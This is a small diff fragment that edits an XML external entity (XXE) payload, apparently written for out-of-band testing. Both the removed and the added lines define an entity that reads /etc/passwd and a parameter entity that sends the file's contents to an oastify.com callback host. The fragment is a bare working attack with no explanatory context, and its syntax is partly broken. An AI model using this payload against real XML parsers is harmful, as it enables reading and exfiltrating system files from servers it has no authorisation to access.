@@ -1,5 +1,4 @@
-<!ENTITY  xxe SYSTEM "file:///etc/passwd">
-<!ENTITY  xee "<!ENTITY &#x25; exfiltrate SYSTEM 'http://n4sx2omfykkt6qgfrccf59g0mrsigj48.oastify.com/?x=%file;'>">
-%xee;
-%exfiltrate;
+<!ENTITY  file SYSTEM "file:///etc/passwd">
+<!ENTITY % xee SYSTEM "http://eewocfw68bukghq613m6f0qrwi29q0ho6.oastify.com/?x=%file"> %xee;]>
+
 
